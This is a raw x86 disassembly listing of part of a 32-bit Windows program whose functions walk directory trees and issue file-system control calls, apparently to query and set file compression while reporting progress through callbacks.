  4043f5:	fild   QWORD PTR [esi+0x30]
  4043f8:	fstp   QWORD PTR [esp+0x10]
  4043fc:	fld    QWORD PTR [esp+0x10]
  404400:	fild   QWORD PTR [esp+0x18]
  404404:	fstp   QWORD PTR [esp+0x10]
  404408:	fdiv   QWORD PTR [esp+0x10]
  40440c:	fstp   QWORD PTR [esp+0x10]
  404410:	push   esi
  404411:	push   0x20
  404413:	pop    ebx
  404414:	push   ebx
  404415:	push   edx
  404416:	lea    eax,[esp+0xec]
  40441d:	xor    edx,edx
  40441f:	push   eax
  404420:	lea    ecx,[esi+0x18]
  404423:	call   0x402b3b
  404428:	push   esi
  404429:	push   ebx
  40442a:	push   0x0
  40442c:	lea    eax,[esp+0xac]
  404433:	xor    edx,edx
  404435:	push   eax
  404436:	lea    ecx,[esi+0x10]
  404439:	call   0x402b3b
  40443e:	push   esi
  40443f:	push   ebx
  404440:	push   0x1
  404442:	lea    eax,[esp+0x6c]
  404446:	xor    edx,edx
  404448:	push   eax
  404449:	lea    ecx,[esi+0x38]
  40444c:	call   0x402b3b
  404451:	push   esi
  404452:	push   ebx
  404453:	push   0x1
  404455:	lea    eax,[esp+0x12c]
  40445c:	xor    edx,edx
  40445e:	push   eax
  40445f:	lea    ecx,[esi+0x30]
  404462:	call   0x402b3b
  404467:	push   0x64
  404469:	push   0x401558
  40446e:	lea    eax,[esp+0x168]
  404475:	push   ebx
  404476:	push   eax
  404477:	call   DWORD PTR ds:0x40c150
  40447d:	fld    QWORD PTR [esp+0x20]
  404481:	lea    eax,[esp+0x30]
  404485:	pop    ecx
  404486:	pop    ecx
  404487:	fstp   QWORD PTR [esp]
  40448a:	push   0x401580
  40448f:	push   ebx
  404490:	push   eax
  404491:	call   DWORD PTR ds:0x40c150
  404497:	lea    ecx,[esi+0x50]
  40449a:	add    esp,0x14
  40449d:	lea    edx,[ecx+0x2]
  4044a0:	xor    ebx,ebx
  4044a2:	mov    ax,WORD PTR [ecx]
  4044a5:	add    ecx,0x2
  4044a8:	cmp    ax,bx
  4044ab:	jne    0x4044a2
  4044ad:	sub    ecx,edx
  4044af:	sar    ecx,1
  4044b1:	cmp    ecx,0x1
  4044b4:	jne    0x4044d5
  4044b6:	lea    ecx,[esp+0x20]
  4044ba:	lea    edx,[ecx+0x2]
  4044bd:	mov    ax,WORD PTR [ecx]
  4044c0:	add    ecx,0x2
  4044c3:	cmp    ax,bx
  4044c6:	jne    0x4044bd
  4044c8:	mov    ax,WORD PTR [esi+0x50]
  4044cc:	sub    ecx,edx
  4044ce:	sar    ecx,1
  4044d0:	mov    WORD PTR [esp+ecx*2+0x1c],ax
  4044d5:	mov    esi,DWORD PTR [esi+0x60]
  4044d8:	lea    eax,[esp+0x20]
  4044dc:	push   eax
  4044dd:	lea    eax,[esp+0x64]
  4044e1:	mov    ecx,esi
  4044e3:	push   eax
  4044e4:	lea    eax,[esp+0x128]
  4044eb:	push   eax
  4044ec:	lea    eax,[esp+0xac]
  4044f3:	push   eax
  4044f4:	lea    eax,[esp+0xf0]
  4044fb:	push   eax
  4044fc:	push   0xc
  4044fe:	call   DWORD PTR ds:0x40c1a4
  404504:	call   esi
  404506:	add    esp,0x18
  404509:	mov    ecx,DWORD PTR [esp+0x1a4]
  404510:	pop    edi
  404511:	pop    esi
  404512:	pop    ebx
  404513:	xor    ecx,esp
  404515:	call   0x406fc0
  40451a:	mov    esp,ebp
  40451c:	pop    ebp
  40451d:	ret    0x4
  404520:	int3   
  404521:	int3   
  404522:	int3   
  404523:	int3   
  404524:	int3   
  404525:	mov    edi,edi
  404527:	push   ebp
  404528:	mov    ebp,esp
  40452a:	sub    esp,0x28
  40452d:	mov    eax,ds:0x408008
  404532:	xor    eax,ebp
  404534:	mov    DWORD PTR [ebp-0x4],eax
  404537:	push   ebx
  404538:	push   esi
  404539:	push   edi
  40453a:	mov    edi,DWORD PTR [ebp+0x8]
  40453d:	mov    eax,ecx
  40453f:	xor    ecx,ecx
  404541:	mov    DWORD PTR [ebp-0x1c],eax
  404544:	mov    esi,edx
  404546:	mov    WORD PTR [ebp-0x20],cx
  40454a:	mov    DWORD PTR [ebp-0x28],esi
  40454d:	test   BYTE PTR [edi],0x20
  404550:	je     0x4045e3
  404556:	test   BYTE PTR [esi],0x10
  404559:	jne    0x404776
  40455f:	xor    ebx,ebx
  404561:	test   BYTE PTR [edi],0x4
  404564:	jne    0x4045af
  404566:	push   ebx
  404567:	lea    ecx,[ebp-0x24]
  40456a:	push   ecx
  40456b:	push   0x14
  40456d:	lea    ecx,[ebp-0x18]
  404570:	push   ecx
  404571:	push   ebx
  404572:	push   ebx
  404573:	push   0x90310
  404578:	push   eax
  404579:	call   DWORD PTR ds:0x40c074
  40457f:	test   eax,eax
  404581:	je     0x404776
  404587:	cmp    DWORD PTR [ebp-0x18],0x1
  40458b:	jne    0x404776
  404591:	cmp    DWORD PTR [ebp-0x14],0x2
  404595:	jne    0x404776
  40459b:	mov    ecx,DWORD PTR [edi+0x4]
  40459e:	cmp    ecx,0xffffffff
  4045a1:	je     0x4045ac
  4045a3:	cmp    ecx,DWORD PTR [ebp-0xc]
  4045a6:	jne    0x404776
  4045ac:	mov    eax,DWORD PTR [ebp-0x1c]
  4045af:	push   ebx
  4045b0:	lea    ecx,[ebp-0x24]
  4045b3:	push   ecx
  4045b4:	push   ebx
  4045b5:	push   ebx
  4045b6:	push   ebx
  4045b7:	push   ebx
  4045b8:	push   0x90314
  4045bd:	push   eax
  4045be:	call   DWORD PTR ds:0x40c074
  4045c4:	test   eax,eax
  4045c6:	jne    0x4046ce
  4045cc:	test   BYTE PTR [edi],0x4
  4045cf:	je     0x40462f
  4045d1:	call   DWORD PTR ds:0x40c048
  4045d7:	cmp    eax,0x156
  4045dc:	jne    0x40462f
  4045de:	jmp    0x404776
  4045e3:	test   DWORD PTR [esi],0x800
  4045e9:	jne    0x4045f5
  4045eb:	test   BYTE PTR [edi],0x4
  4045ee:	jne    0x40460c
  4045f0:	jmp    0x404776
  4045f5:	test   BYTE PTR [edi],0x4
  4045f8:	jne    0x40460c
  4045fa:	mov    ecx,eax
  4045fc:	call   0x4029cd
  404601:	test   al,al
  404603:	jne    0x404776
  404609:	mov    eax,DWORD PTR [ebp-0x1c]
  40460c:	xor    ebx,ebx
  40460e:	lea    ecx,[ebp-0x24]
  404611:	push   ebx
  404612:	push   ecx
  404613:	push   ebx
  404614:	push   ebx
  404615:	push   0x2
  404617:	lea    ecx,[ebp-0x20]
  40461a:	push   ecx
  40461b:	push   0x9c040
  404620:	push   eax
  404621:	call   DWORD PTR ds:0x40c074
  404627:	test   eax,eax
  404629:	jne    0x4046ce
  40462f:	test   BYTE PTR [edi],0x8
  404632:	je     0x40463d
  404634:	test   BYTE PTR [edi],0x2
  404637:	jne    0x4046c1
  40463d:	call   DWORD PTR ds:0x40c048
  404643:	mov    DWORD PTR [ebp-0x1c],eax
  404646:	cmp    DWORD PTR [edi+0x60],ebx
  404649:	je     0x404690
  40464b:	lea    ecx,[esi+0x2c]
  40464e:	mov    esi,0x408440
  404653:	push   ecx
  404654:	push   0x401570
  404659:	push   0x400
  40465e:	push   esi
  40465f:	call   DWORD PTR ds:0x40c150
  404665:	add    esp,0x10
  404668:	push   esi
  404669:	mov    esi,DWORD PTR [edi+0x60]
  40466c:	mov    ecx,esi
  40466e:	push   0x15
  404670:	call   DWORD PTR ds:0x40c1a4
  404676:	call   esi
  404678:	mov    esi,DWORD PTR [edi+0x60]
  40467b:	pop    ecx
  40467c:	pop    ecx
  40467d:	push   0x2
  40467f:	mov    ecx,esi
  404681:	call   DWORD PTR ds:0x40c1a4
  404687:	call   esi
  404689:	mov    esi,DWORD PTR [ebp-0x28]
  40468c:	mov    eax,DWORD PTR [ebp-0x1c]
  40468f:	pop    ecx
  404690:	test   BYTE PTR [edi],0xa
  404693:	jne    0x4046c1
  404695:	cmp    eax,0x1
  404698:	jne    0x4046a9
  40469a:	mov    ebx,DWORD PTR [edi+0x60]
  40469d:	test   ebx,ebx
  40469f:	je     0x4046c1
  4046a1:	lea    eax,[esi+0x2c]
  4046a4:	push   eax
  4046a5:	push   0x17
  4046a7:	jmp    0x4046b5
  4046a9:	mov    ebx,DWORD PTR [edi+0x64]
  4046ac:	test   ebx,ebx
  4046ae:	je     0x4046c1
  4046b0:	push   eax
  4046b1:	lea    eax,[esi+0x2c]
  4046b4:	push   eax
  4046b5:	mov    ecx,ebx
  4046b7:	call   DWORD PTR ds:0x40c1a4
  4046bd:	call   ebx
  4046bf:	pop    ecx
  4046c0:	pop    ecx
  4046c1:	movsx  eax,BYTE PTR [edi]
  4046c4:	and    eax,0x2
  4046c7:	shr    eax,1
  4046c9:	jmp    0x404778
  4046ce:	test   BYTE PTR [edi],0x40
  4046d1:	je     0x404719
  4046d3:	test   BYTE PTR [edi],0x80
  4046d6:	je     0x40476f
  4046dc:	mov    esi,DWORD PTR [edi+0x60]
  4046df:	test   esi,esi
  4046e1:	je     0x40476f
  4046e7:	push   ebx
  4046e8:	push   0x14
  4046ea:	push   DWORD PTR [edi+0x1c]
  4046ed:	push   DWORD PTR [edi+0x18]
  4046f0:	call   0x407770
  4046f5:	or     eax,edx
  4046f7:	jne    0x40476f
  4046f9:	mov    eax,DWORD PTR [edi+0x6c]
  4046fc:	mov    ecx,esi
  4046fe:	inc    eax
  4046ff:	and    eax,0x3
  404702:	mov    DWORD PTR [edi+0x6c],eax
  404705:	push   DWORD PTR [eax*4+0x4015a0]
  40470c:	push   0x1f
  40470e:	call   DWORD PTR ds:0x40c1a4
  404714:	call   esi
  404716:	pop    ecx
  404717:	jmp    0x40476e
  404719:	test   BYTE PTR [edi],0x8
  40471c:	jne    0x40476f
  40471e:	cmp    DWORD PTR [edi+0x60],ebx
  404721:	je     0x40476f
  404723:	test   BYTE PTR [edi],0x10
  404726:	jne    0x404730
  404728:	test   DWORD PTR [esi],0x6
  40472e:	jne    0x40476f
  404730:	lea    eax,[esi+0x2c]
  404733:	mov    esi,0x408440
  404738:	push   eax
  404739:	push   0x401570
  40473e:	push   0x400
  404743:	push   esi
  404744:	call   DWORD PTR ds:0x40c150
  40474a:	add    esp,0x10
  40474d:	push   esi
  40474e:	mov    esi,DWORD PTR [edi+0x60]
  404751:	mov    ecx,esi
  404753:	push   0x15
  404755:	call   DWORD PTR ds:0x40c1a4
  40475b:	call   esi
  40475d:	mov    esi,DWORD PTR [edi+0x60]
  404760:	pop    ecx
  404761:	pop    ecx
  404762:	push   0x1
  404764:	mov    ecx,esi
  404766:	call   DWORD PTR ds:0x40c1a4
  40476c:	call   esi
  40476e:	pop    ecx
  40476f:	add    DWORD PTR [edi+0x18],0x1
  404773:	adc    DWORD PTR [edi+0x1c],ebx
  404776:	mov    al,0x1
  404778:	mov    ecx,DWORD PTR [ebp-0x4]
  40477b:	pop    edi
  40477c:	pop    esi
  40477d:	xor    ecx,ebp
  40477f:	pop    ebx
  404780:	call   0x406fc0
  404785:	mov    esp,ebp
  404787:	pop    ebp
  404788:	ret    0x4
  40478b:	int3   
  40478c:	int3   
  40478d:	int3   
  40478e:	int3   
  40478f:	int3   
  404790:	mov    edi,edi
  404792:	push   ebp
  404793:	mov    ebp,esp
  404795:	and    esp,0xfffffff8
  404798:	sub    esp,0x274
  40479e:	mov    eax,ds:0x408008
  4047a3:	xor    eax,esp
  4047a5:	mov    DWORD PTR [esp+0x270],eax
  4047ac:	mov    eax,DWORD PTR [ebp+0xc]
  4047af:	push   ebx
  4047b0:	mov    ebx,DWORD PTR [ebp+0x8]
  4047b3:	push   esi
  4047b4:	push   edi
  4047b5:	mov    edi,DWORD PTR [ebp+0x10]
  4047b8:	mov    DWORD PTR [esp+0x24],eax
  4047bc:	test   BYTE PTR [edi],0x40
  4047bf:	je     0x4047d9
  4047c1:	mov    edx,0x4080a0
  4047c6:	mov    ecx,ebx
  4047c8:	call   0x402a94
  4047cd:	test   al,al
  4047cf:	jne    0x404ce7
  4047d5:	mov    eax,DWORD PTR [esp+0x24]
  4047d9:	and    DWORD PTR [esp+0x20],0x0
  4047de:	mov    ecx,eax
  4047e0:	xor    esi,esi
  4047e2:	lea    edx,[ecx+0x2]
  4047e5:	mov    ax,WORD PTR [ecx]
  4047e8:	add    ecx,0x2
  4047eb:	cmp    ax,si
  4047ee:	jne    0x4047e5
  4047f0:	sub    ecx,edx
  4047f2:	sar    ecx,1
  4047f4:	jne    0x40492a
  4047fa:	xor    eax,eax
  4047fc:	test   BYTE PTR [edi],0x20
  4047ff:	mov    WORD PTR [esp+0x14],ax
  404804:	jne    0x404ce7
  40480a:	mov    esi,DWORD PTR [edi+0x68]
  40480d:	mov    ecx,esi
  40480f:	push   edi
  404810:	push   ebx
  404811:	call   DWORD PTR ds:0x40c1a4
  404817:	call   esi
  404819:	mov    DWORD PTR [esp+0x10],eax
  40481d:	cmp    eax,0xffffffff
  404820:	jne    0x404858
  404822:	test   BYTE PTR [edi],0x8
  404825:	je     0x40482c
  404827:	test   BYTE PTR [edi],0x2
  40482a:	jne    0x404843
  40482c:	call   DWORD PTR ds:0x40c048
  404832:	mov    esi,DWORD PTR [edi+0x64]
  404835:	mov    ecx,esi
  404837:	push   eax
  404838:	push   ebx
  404839:	call   DWORD PTR ds:0x40c1a4
  40483f:	call   esi
  404841:	pop    ecx
  404842:	pop    ecx
  404843:	push   0xffffffff
  404845:	call   DWORD PTR ds:0x40c0f4
  40484b:	movsx  eax,BYTE PTR [edi]
  40484e:	and    eax,0x2
  404851:	shr    eax,1
  404853:	jmp    0x404ce9
  404858:	mov    esi,DWORD PTR [edi+0x60]
  40485b:	test   esi,esi
  40485d:	je     0x404872
  40485f:	push   ebx
  404860:	push   0xd
  404862:	mov    ecx,esi
  404864:	call   DWORD PTR ds:0x40c1a4
  40486a:	call   esi
  40486c:	mov    eax,DWORD PTR [esp+0x18]
  404870:	pop    ecx
  404871:	pop    ecx
  404872:	xor    edx,edx
  404874:	lea    ecx,[esp+0x1c]
  404878:	push   edx
  404879:	push   ecx
  40487a:	push   edx
  40487b:	push   edx
  40487c:	push   0x2
  40487e:	lea    ecx,[esp+0x28]
  404882:	push   ecx
  404883:	push   0x9c040
  404888:	push   eax
  404889:	call   DWORD PTR ds:0x40c074
  40488f:	mov    esi,DWORD PTR [edi+0x60]
  404892:	test   eax,eax
  404894:	jne    0x4048f4
  404896:	test   esi,esi
  404898:	je     0x4048b1
  40489a:	test   BYTE PTR [edi],0x8
  40489d:	je     0x4048a4
  40489f:	test   BYTE PTR [edi],0x2
  4048a2:	jne    0x4048b1
  4048a4:	push   0x2
  4048a6:	mov    ecx,esi
  4048a8:	call   DWORD PTR ds:0x40c1a4
  4048ae:	call   esi
  4048b0:	pop    ecx
  4048b1:	test   BYTE PTR [edi],0xa
  4048b4:	jne    0x4048eb
  4048b6:	call   DWORD PTR ds:0x40c048
  4048bc:	cmp    eax,0x1
  4048bf:	jne    0x4048cd
  4048c1:	mov    esi,DWORD PTR [edi+0x60]
  4048c4:	test   esi,esi
  4048c6:	je     0x4048eb
  4048c8:	push   ebx
  4048c9:	push   0x1a
  4048cb:	jmp    0x4048df
  4048cd:	xor    eax,eax
  4048cf:	cmp    DWORD PTR [edi+0x64],eax
  4048d2:	je     0x4048eb
  4048d4:	call   DWORD PTR ds:0x40c048
  4048da:	mov    esi,DWORD PTR [edi+0x64]
  4048dd:	push   eax
  4048de:	push   ebx
  4048df:	mov    ecx,esi
  4048e1:	call   DWORD PTR ds:0x40c1a4
  4048e7:	call   esi
  4048e9:	pop    ecx
  4048ea:	pop    ecx
  4048eb:	push   DWORD PTR [esp+0x10]
  4048ef:	jmp    0x404845
  4048f4:	test   esi,esi
  4048f6:	je     0x40490a
  4048f8:	test   BYTE PTR [edi],0x8
  4048fb:	jne    0x40490a
  4048fd:	push   0x1
  4048ff:	mov    ecx,esi
  404901:	call   DWORD PTR ds:0x40c1a4
  404907:	call   esi
  404909:	pop    ecx
  40490a:	push   DWORD PTR [esp+0x10]
  40490e:	call   DWORD PTR ds:0x40c0f4
  404914:	add    DWORD PTR [edi+0x10],0x1
  404918:	push   0x0
  40491a:	pop    eax
  40491b:	adc    DWORD PTR [edi+0x14],eax
  40491e:	add    DWORD PTR [edi+0x18],0x1
  404922:	adc    DWORD PTR [edi+0x1c],eax
  404925:	jmp    0x404ce7
  40492a:	mov    ecx,ebx
  40492c:	lea    edx,[ecx+0x2]
  40492f:	mov    ax,WORD PTR [ecx]
  404932:	add    ecx,0x2
  404935:	cmp    ax,si
  404938:	jne    0x40492f
  40493a:	sub    ecx,edx
  40493c:	sar    ecx,1
  40493e:	push   ebx
  40493f:	lea    eax,[ebx+ecx*2]
  404942:	mov    DWORD PTR [esp+0x18],eax
  404946:	call   DWORD PTR ds:0x40c064
  40494c:	cmp    eax,0xffffffff
  40494f:	jne    0x404976
  404951:	cmp    DWORD PTR [edi+0x64],esi
  404954:	je     0x40484b
  40495a:	call   DWORD PTR ds:0x40c048
  404960:	mov    esi,DWORD PTR [edi+0x64]
  404963:	mov    ecx,esi
  404965:	push   eax
  404966:	push   ebx
  404967:	call   DWORD PTR ds:0x40c1a4
  40496d:	call   esi
  40496f:	pop    ecx
  404970:	pop    ecx
  404971:	jmp    0x40484b
  404976:	test   BYTE PTR [edi],0x40
  404979:	je     0x4049b0
  40497b:	test   BYTE PTR [edi],0x80
  40497e:	je     0x4049d1
  404980:	mov    esi,DWORD PTR [edi+0x60]
  404983:	test   esi,esi
  404985:	je     0x4049d1
  404987:	xor    eax,eax
  404989:	push   eax
  40498a:	push   0x28
  40498c:	push   DWORD PTR [edi+0x14]
  40498f:	push   DWORD PTR [edi+0x10]
  404992:	call   0x407770
  404997:	or     eax,edx
  404999:	jne    0x4049d1
  40499b:	mov    eax,DWORD PTR [edi+0x6c]
  40499e:	inc    eax
  40499f:	and    eax,0x3
  4049a2:	mov    DWORD PTR [edi+0x6c],eax
  4049a5:	push   DWORD PTR [eax*4+0x4015a0]
  4049ac:	push   0x1f
  4049ae:	jmp    0x4049c5
  4049b0:	mov    esi,DWORD PTR [edi+0x60]
  4049b3:	test   esi,esi
  4049b5:	je     0x4049d1
  4049b7:	push   ebx
  4049b8:	test   eax,0x800
  4049bd:	je     0x4049c3
  4049bf:	push   0xe
  4049c1:	jmp    0x4049c5
  4049c3:	push   0xf
  4049c5:	mov    ecx,esi
  4049c7:	call   DWORD PTR ds:0x40c1a4
  4049cd:	call   esi
  4049cf:	pop    ecx
  4049d0:	pop    ecx
  4049d1:	mov    esi,DWORD PTR [esp+0x24]
  4049d5:	mov    ecx,esi
  4049d7:	add    DWORD PTR [edi+0x10],0x1
  4049db:	push   0x0
  4049dd:	pop    eax
  4049de:	adc    DWORD PTR [edi+0x14],eax
  4049e1:	lea    edx,[ecx+0x2]
  4049e4:	mov    ax,WORD PTR [ecx]
  4049e7:	add    ecx,0x2
  4049ea:	cmp    ax,WORD PTR [esp+0x20]
  4049ef:	jne    0x4049e4
  4049f1:	sub    ecx,edx
  4049f3:	mov    edx,DWORD PTR [esp+0x14]
  4049f7:	sub    edx,ebx
  4049f9:	sar    ecx,1
  4049fb:	sar    edx,1
  4049fd:	mov    DWORD PTR [esp+0x18],edx
  404a01:	lea    eax,[edx+ecx*1]
  404a04:	cmp    eax,0x104
  404a09:	jae    0x404b87
  404a0f:	mov    eax,0x104
  404a14:	sub    eax,edx
  404a16:	push   esi
  404a17:	mov    esi,DWORD PTR [esp+0x18]
  404a1b:	push   eax
  404a1c:	push   esi
  404a1d:	mov    DWORD PTR [esp+0x28],eax
  404a21:	call   DWORD PTR ds:0x40c15c
  404a27:	add    esp,0xc
  404a2a:	lea    eax,[esp+0x28]
  404a2e:	push   eax
  404a2f:	push   ebx
  404a30:	call   DWORD PTR ds:0x40c058
  404a36:	mov    DWORD PTR [esp+0x10],eax
  404a3a:	cmp    eax,0xffffffff
  404a3d:	je     0x404c1c
  404a43:	mov    esi,eax
  404a45:	mov    edx,0x40109c
  404a4a:	lea    ecx,[esp+0x54]
  404a4e:	mov    ax,WORD PTR [ecx]
  404a51:	cmp    ax,WORD PTR [edx]
  404a54:	jne    0x404a74
  404a56:	test   ax,ax
  404a59:	je     0x404a70
  404a5b:	mov    ax,WORD PTR [ecx+0x2]
  404a5f:	cmp    ax,WORD PTR [edx+0x2]
  404a63:	jne    0x404a74
  404a65:	add    ecx,0x4
  404a68:	add    edx,0x4
  404a6b:	test   ax,ax
  404a6e:	jne    0x404a4e
  404a70:	xor    eax,eax
  404a72:	jmp    0x404a79
  404a74:	sbb    eax,eax
  404a76:	or     eax,0x1
  404a79:	test   eax,eax
  404a7b:	je     0x404b68
  404a81:	mov    ecx,0x401550
  404a86:	lea    eax,[esp+0x54]
  404a8a:	mov    dx,WORD PTR [eax]
  404a8d:	cmp    dx,WORD PTR [ecx]
  404a90:	jne    0x404ab0
  404a92:	test   dx,dx
  404a95:	je     0x404aac
  404a97:	mov    dx,WORD PTR [eax+0x2]
  404a9b:	cmp    dx,WORD PTR [ecx+0x2]
  404a9f:	jne    0x404ab0
  404aa1:	add    eax,0x4
  404aa4:	add    ecx,0x4
  404aa7:	test   dx,dx
  404aaa:	jne    0x404a8a
  404aac:	xor    eax,eax
  404aae:	jmp    0x404ab5
  404ab0:	sbb    eax,eax
  404ab2:	or     eax,0x1
  404ab5:	test   eax,eax
  404ab7:	je     0x404b68
  404abd:	lea    ecx,[esp+0x54]
  404ac1:	lea    edx,[ecx+0x2]
  404ac4:	mov    ax,WORD PTR [ecx]
  404ac7:	add    ecx,0x2
  404aca:	cmp    ax,WORD PTR [esp+0x20]
  404acf:	jne    0x404ac4
  404ad1:	mov    eax,DWORD PTR [esp+0x18]
  404ad5:	sub    ecx,edx
  404ad7:	sar    ecx,1
  404ad9:	add    eax,ecx
  404adb:	cmp    eax,0x104
  404ae0:	jae    0x404b68
  404ae6:	lea    eax,[esp+0x54]
  404aea:	push   eax
  404aeb:	push   DWORD PTR [esp+0x20]
  404aef:	push   DWORD PTR [esp+0x1c]
  404af3:	call   DWORD PTR ds:0x40c15c
  404af9:	mov    esi,DWORD PTR [edi+0x68]
  404afc:	add    esp,0xc
  404aff:	mov    ecx,esi
  404b01:	push   edi
  404b02:	push   ebx
  404b03:	call   DWORD PTR ds:0x40c1a4
  404b09:	call   esi
  404b0b:	mov    esi,eax
  404b0d:	cmp    esi,0xffffffff
  404b10:	jne    0x404b49
  404b12:	test   BYTE PTR [edi],0x8
  404b15:	je     0x404b1c
  404b17:	test   BYTE PTR [edi],0x2
  404b1a:	jne    0x404b64
  404b1c:	call   DWORD PTR ds:0x40c048
  404b22:	mov    esi,DWORD PTR [edi+0x64]
  404b25:	mov    ecx,esi
  404b27:	push   eax
  404b28:	push   ebx
  404b29:	call   DWORD PTR ds:0x40c1a4
  404b2f:	call   esi
  404b31:	test   BYTE PTR [edi],0x2
  404b34:	pop    ecx
  404b35:	pop    ecx
  404b36:	jne    0x404b64
  404b38:	push   DWORD PTR [esp+0x10]
  404b3c:	call   DWORD PTR ds:0x40c070
  404b42:	xor    al,al
  404b44:	jmp    0x404ce9
  404b49:	push   edi
  404b4a:	lea    edx,[esp+0x2c]
  404b4e:	mov    ecx,esi
  404b50:	call   0x404525
  404b55:	push   esi
  404b56:	test   al,al
  404b58:	je     0x404c07
  404b5e:	call   DWORD PTR ds:0x40c0f4
  404b64:	mov    esi,DWORD PTR [esp+0x10]
  404b68:	lea    eax,[esp+0x28]
  404b6c:	push   eax
  404b6d:	push   esi
  404b6e:	call   DWORD PTR ds:0x40c078
  404b74:	test   eax,eax
  404b76:	jne    0x404a45
  404b7c:	push   esi
  404b7d:	call   DWORD PTR ds:0x40c070
  404b83:	mov    edx,DWORD PTR [esp+0x18]
  404b87:	mov    esi,DWORD PTR [esp+0x14]
  404b8b:	test   BYTE PTR [edi],0x1
  404b8e:	je     0x404ce7
  404b94:	lea    eax,[edx+0x1]
  404b97:	mov    DWORD PTR [esp+0x1c],eax
  404b9b:	cmp    eax,0x104
  404ba0:	jae    0x404ce7
  404ba6:	mov    eax,0x104
  404bab:	sub    eax,edx
  404bad:	push   0x401178
  404bb2:	push   eax
  404bb3:	push   esi
  404bb4:	mov    DWORD PTR [esp+0x24],eax
  404bb8:	call   DWORD PTR ds:0x40c15c
  404bbe:	add    esp,0xc
  404bc1:	lea    eax,[esp+0x28]
  404bc5:	push   eax
  404bc6:	push   ebx
  404bc7:	call   DWORD PTR ds:0x40c058
  404bcd:	mov    esi,eax
  404bcf:	cmp    esi,0xffffffff
  404bd2:	je     0x404ce7
  404bd8:	mov    edx,0x40109c
  404bdd:	lea    ecx,[esp+0x54]
  404be1:	mov    ax,WORD PTR [ecx]
  404be4:	cmp    ax,WORD PTR [edx]
  404be7:	jne    0x404c25
  404be9:	test   ax,ax
  404bec:	je     0x404c03
  404bee:	mov    ax,WORD PTR [ecx+0x2]
  404bf2:	cmp    ax,WORD PTR [edx+0x2]
  404bf6:	jne    0x404c25
  404bf8:	add    ecx,0x4
  404bfb:	add    edx,0x4
  404bfe:	test   ax,ax
  404c01:	jne    0x404be1
  404c03:	xor    eax,eax
  404c05:	jmp    0x404c2a
  404c07:	call   DWORD PTR ds:0x40c0f4
  404c0d:	push   DWORD PTR [esp+0x10]
  404c11:	call   DWORD PTR ds:0x40c070
  404c17:	jmp    0x40484b
  404c1c:	mov    edx,DWORD PTR [esp+0x18]
  404c20:	jmp    0x404b8b
  404c25:	sbb    eax,eax
  404c27:	or     eax,0x1
  404c2a:	test   eax,eax
  404c2c:	je     0x404ccc
  404c32:	mov    ecx,0x401550
  404c37:	lea    eax,[esp+0x54]
  404c3b:	mov    dx,WORD PTR [eax]
  404c3e:	cmp    dx,WORD PTR [ecx]
  404c41:	jne    0x404c61
  404c43:	test   dx,dx
  404c46:	je     0x404c5d
  404c48:	mov    dx,WORD PTR [eax+0x2]
  404c4c:	cmp    dx,WORD PTR [ecx+0x2]
  404c50:	jne    0x404c61
  404c52:	add    eax,0x4
  404c55:	add    ecx,0x4
  404c58:	test   dx,dx
  404c5b:	jne    0x404c3b
  404c5d:	xor    eax,eax
  404c5f:	jmp    0x404c66
  404c61:	sbb    eax,eax
  404c63:	or     eax,0x1
  404c66:	test   eax,eax
  404c68:	je     0x404ccc
  404c6a:	test   BYTE PTR [esp+0x28],0x10
  404c6f:	je     0x404ccc
  404c71:	lea    ecx,[esp+0x54]
  404c75:	lea    edx,[ecx+0x2]
  404c78:	mov    ax,WORD PTR [ecx]
  404c7b:	add    ecx,0x2
  404c7e:	cmp    ax,WORD PTR [esp+0x20]
  404c83:	jne    0x404c78
  404c85:	mov    eax,DWORD PTR [esp+0x1c]
  404c89:	sub    ecx,edx
  404c8b:	sar    ecx,1
  404c8d:	add    eax,ecx
  404c8f:	cmp    eax,0x104
  404c94:	jae    0x404ccc
  404c96:	lea    eax,[esp+0x54]
  404c9a:	push   eax
  404c9b:	push   DWORD PTR [esp+0x1c]
  404c9f:	push   DWORD PTR [esp+0x1c]
  404ca3:	call   DWORD PTR ds:0x40c15c
  404ca9:	push   0x401180
  404cae:	push   0x104
  404cb3:	push   ebx
  404cb4:	call   DWORD PTR ds:0x40c160
  404cba:	add    esp,0x18
  404cbd:	push   edi
  404cbe:	push   DWORD PTR [esp+0x28]
  404cc2:	push   ebx
  404cc3:	call   0x404790
  404cc8:	test   al,al
  404cca:	je     0x404d00
  404ccc:	lea    eax,[esp+0x28]
  404cd0:	push   eax
  404cd1:	push   esi
  404cd2:	call   DWORD PTR ds:0x40c078
  404cd8:	test   eax,eax
  404cda:	jne    0x404bd8
  404ce0:	push   esi
  404ce1:	call   DWORD PTR ds:0x40c070
  404ce7:	mov    al,0x1
  404ce9:	mov    ecx,DWORD PTR [esp+0x27c]
  404cf0:	pop    edi
  404cf1:	pop    esi
  404cf2:	pop    ebx
  404cf3:	xor    ecx,esp
  404cf5:	call   0x406fc0
  404cfa:	mov    esp,ebp
  404cfc:	pop    ebp
  404cfd:	ret    0xc
  404d00:	push   esi
  404d01:	jmp    0x404c11
  404d06:	int3   
  404d07:	int3   
  404d08:	int3   
  404d09:	int3   
  404d0a:	int3   
  404d0b:	int3   
  404d0c:	int3   
  404d0d:	int3   
  404d0e:	int3   
  404d0f:	int3   
  404d10:	mov    edi,edi
  404d12:	push   ebp
  404d13:	mov    ebp,esp
  404d15:	and    esp,0xfffffff8
  404d18:	sub    esp,0x8c
  404d1e:	mov    eax,ds:0x408008
  404d23:	xor    eax,esp
  404d25:	mov    DWORD PTR [esp+0x88],eax
  404d2c:	push   esi
  404d2d:	mov    esi,DWORD PTR [ebp+0x8]
  404d30:	cmp    DWORD PTR [esi+0x60],0x0
  404d34:	je     0x404d7a
  404d36:	push   esi
  404d37:	push   0x20
  404d39:	push   0x0
  404d3b:	lea    eax,[esp+0x54]
  404d3f:	xor    edx,edx
  404d41:	push   eax
  404d42:	lea    ecx,[esi+0x18]
  404d45:	call   0x402b3b
  404d4a:	push   esi
  404d4b:	push   0x20
  404d4d:	push   0x0
  404d4f:	lea    eax,[esp+0x14]
  404d53:	xor    edx,edx
  404d55:	push   eax
  404d56:	lea    ecx,[esi+0x10]
  404d59:	call   0x402b3b
  404d5e:	mov    esi,DWORD PTR [esi+0x60]
  404d61:	lea    eax,[esp+0x8]
  404d65:	push   eax
  404d66:	lea    eax,[esp+0x4c]
  404d6a:	mov    ecx,esi
  404d6c:	push   eax
  404d6d:	push   0x10
  404d6f:	call   DWORD PTR ds:0x40c1a4
  404d75:	call   esi
  404d77:	add    esp,0xc
  404d7a:	mov    ecx,DWORD PTR [esp+0x8c]
  404d81:	pop    esi
  404d82:	xor    ecx,esp
  404d84:	call   0x406fc0
  404d89:	mov    esp,ebp
